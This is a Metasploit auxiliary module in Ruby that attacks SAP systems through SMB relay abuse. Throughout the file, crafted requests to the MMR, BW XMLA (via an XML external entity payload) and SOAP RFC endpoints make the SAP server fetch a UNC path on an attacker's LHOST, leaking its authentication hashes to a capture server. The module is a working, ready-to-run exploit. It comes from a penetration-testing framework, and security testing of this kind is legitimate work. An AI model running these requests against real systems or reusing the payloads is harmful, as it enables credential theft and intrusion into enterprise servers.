##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'SAP SMB Relay Abuse',
      'Description' => %q{
          This module exploits provides several SMB Relay abuse through different SAP
        services and functions. The attack is done through specially crafted requests
        including a UNC Path which will be accessing by the SAP system while trying to
        process the request.  In order to get the hashes the auxiliary/server/capture/smb
        module can be used.
      },
      'References' => [
        [ 'URL', 'http://erpscan.com/advisories/dsecrg-12-033-sap-basis-6-407-02-xml-external-entity/' ],
        [ 'URL', 'https://service.sap.com/sap/support/notes/1597066' ]
      ],
      'Author' =>
        [
          'Alexey Tyurin', # xmla service SMB relay abuse discovery
          'nmonkee' # Metasploit module
        ],
      'License' => MSF_LICENSE
    )

    register_options([
      Opt::RPORT(8000),
      OptString.new('CLIENT',   [true,  'SAP client', '001']),
      OptString.new('USERNAME', [false, 'Username (Ex SAP*)']),
      OptString.new('PASSWORD', [false, 'Password (Ex 06071992)']),
      OptAddress.new('LHOST',   [true,  'Server IP or hostname of the SMB Capture system']),
      OptEnum.new('ABUSE',      [true,  'SMB Relay abuse to use', "MMR",
        [
          "MMR",
          "BW",
          "CLBA_CLASSIF_FILE_REMOTE_HOST",
          "CLBA_UPDATE_FILE_REMOTE_HOST"
        ]
      ]),
    ], self.class)

  end

  def valid_credentials?
    if datastore['USERNAME'].nil? or datastore['USERNAME'].empty?
      return false
    end

    if datastore['PASSWORD'].nil? or datastore['PASSWORD'].empty?
      return false
    end
    return true
  end

  def run_xmla

    if not valid_credentials?
      vprint_error("#{rhost}:#{rport} - Credentials needed in order to abuse the SAP BW service")
      return
    end

    smb_uri = "\\\\#{datastore['LHOST']}\\#{Rex::Text.rand_text_alpha_lower(7)}.#{Rex::Text.rand_text_alpha_lower(3)}"
    data = '<?xml version="1.0" encoding="utf-8" ?>'
    data << '<!DOCTYPE root ['
    data << '<!ENTITY foo SYSTEM "' + smb_uri + '">'
    data << ']>'
    data << '<in>&foo;</in>'

    begin
      print_status("#{rhost}:#{rport} - Sending request for #{smb_uri}")
      res = send_request_raw({
        'uri' => '/sap/bw/xml/soap/xmla?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
        'method' => 'POST',
        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
        'data' => data,
        'ctype' => 'text/xml; charset=UTF-8',
        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT']
      })
      if res and res.code == 200 and res.body =~ /XML for Analysis Provider/ and res.body =~ /Request transfered is not a valid XML/
        print_good("#{rhost}:#{rport} - SMB Relay looks successful, check your SMB capture machine")
      else
        vprint_status("#{rhost}:#{rport} - Response: #{res.code} - #{res.message}") if res
      end
    rescue ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - Unable to connect")
      return
    end
  end

  def run_mmr
    begin
      smb_uri = "\\\\#{datastore['LHOST']}\\#{Rex::Text.rand_text_alpha_lower(7)}.#{Rex::Text.rand_text_alpha_lower(3)}"

      if datastore['USERNAME'].empty?
        vprint_status("#{rhost}:#{rport} - Sending unauthenticated request for #{smb_uri}")
        res = send_request_cgi({
          'uri' => '/mmr/MMR',
          'method' => 'HEAD',
          'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
          'ctype' => 'text/xml; charset=UTF-8',
          'vars_get' => {
            'sap-client' => datastore['CLIENT'],
            'sap-language' => 'EN',
            'filename' => smb_uri
          }
        })

      else
        vprint_status("#{rhost}:#{rport} - Sending authenticated request for #{smb_uri}")
        res = send_request_cgi({
          'uri' => '/mmr/MMR',
          'method' => 'GET',
          'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
          'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
          'ctype' => 'text/xml; charset=UTF-8',
          'vars_get' => {
            'sap-client' => datastore['CLIENT'],
            'sap-language' => 'EN',
            'filename' => smb_uri
          }
        })
      end

      if res
        vprint_status("#{rhost}:#{rport} - Response: #{res.code} - #{res.message}")
      end
    rescue ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - Unable to connect")
      return
    end
  end

  def send_soap_rfc_request(data, smb_uri)
    if not valid_credentials?
      vprint_error("#{rhost}:#{rport} - Credentials needed in order to abuse the SAP SOAP RFC service")
      return
    end

    begin
      vprint_status("#{rhost}:#{rport} - Sending request for #{smb_uri}")
      res = send_request_cgi({
        'uri' => '/sap/bc/soap/rfc',
        'method' => 'POST',
        'data' => data,
        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
        'ctype' => 'text/xml; charset=UTF-8',
        'headers' => {
          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
        },
        'vars_get' => {
          'sap-client' => datastore['CLIENT'],
          'sap-language' => 'EN'
        }
      })
      if res and res.code == 500 and res.body =~ /OPEN_FAILURE/
        print_good("#{rhost}:#{rport} - SMB Relay looks successful, check your SMB capture machine")
      else
        vprint_status("#{rhost}:#{rport} - Response: #{res.code} - #{res.message}") if res
      end
    rescue ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - Unable to connect")
      return
    end
  end

  def run_clba_classif_file_remote
    smb_uri = "\\\\#{datastore['LHOST']}\\#{Rex::Text.rand_text_alpha_lower(7)}.#{Rex::Text.rand_text_alpha_lower(3)}"

    data = '<?xml version="1.0" encoding="utf-8" ?>'
    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" '
    data << 'xmlns:xsd="http://www.w3.org/1999/XMLSchema" xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance" xmlns:m0="http://tempuri.org/" '
    data << 'xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">'
    data << '<SOAP-ENV:Header/>'
    data << '<SOAP-ENV:Body>'
    data << '<CLBA_CLASSIF_FILE_REMOTE_HOST xmlns="urn:sap-com:document:sap:rfc:functions">'
    data << '<CLASSIF_FILE>'
    data << '<item>'
    data << '<ZEILE>a</ZEILE>'
    data << '</item>'
    data << '</CLASSIF_FILE>'
    data << '<FILE_NAME>' + smb_uri + '</FILE_NAME>'
    data << '</CLBA_CLASSIF_FILE_REMOTE_HOST>'
    data << '</SOAP-ENV:Body>'
    data << '</SOAP-ENV:Envelope>'
    send_soap_rfc_request(data, smb_uri)
  end

  def run_clba_update_file_remote
    smb_uri = "\\\\#{datastore['LHOST']}\\#{Rex::Text.rand_text_alpha_lower(7)}.#{Rex::Text.rand_text_alpha_lower(3)}"

    data = '<?xml version="1.0" encoding="utf-8" ?>'
    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" '
    data << 'xmlns:xsd="http://www.w3.org/1999/XMLSchema" xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance" xmlns:m0="http://tempuri.org/" '
    data << 'xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">'
    data << '<SOAP-ENV:Header/>'
    data << '<SOAP-ENV:Body>'
    data << '<CLBA_UPDATE_FILE_REMOTE_HOST xmlns="urn:sap-com:document:sap:rfc:functions">'
    data << '<DATA_TAB>'
    data << '<item>'
    data << '<TABNAME>a</TABNAME>'
    data << '<NUMMER>0</NUMMER>'
    data << '<TEXT>a</TEXT>'
    data << '<COLOR>a</COLOR>'
    data << '<DATA>a</DATA>'
    data << '</item>'
    data << '</DATA_TAB>'
    data << '<FILE_NAME>' + smb_uri + '</FILE_NAME>'
    data << '</CLBA_UPDATE_FILE_REMOTE_HOST>'
    data << '</SOAP-ENV:Body>'
    data << '</SOAP-ENV:Envelope>'
    send_soap_rfc_request(data, smb_uri)
  end

  def run_host(ip)
    case datastore['ABUSE']
      when "MMR"
        run_mmr
      when "BW"
        run_xmla
      when "CLBA_CLASSIF_FILE_REMOTE_HOST"
        run_clba_classif_file_remote
      when "CLBA_UPDATE_FILE_REMOTE_HOST"
        run_clba_update_file_remote
    end
  end

end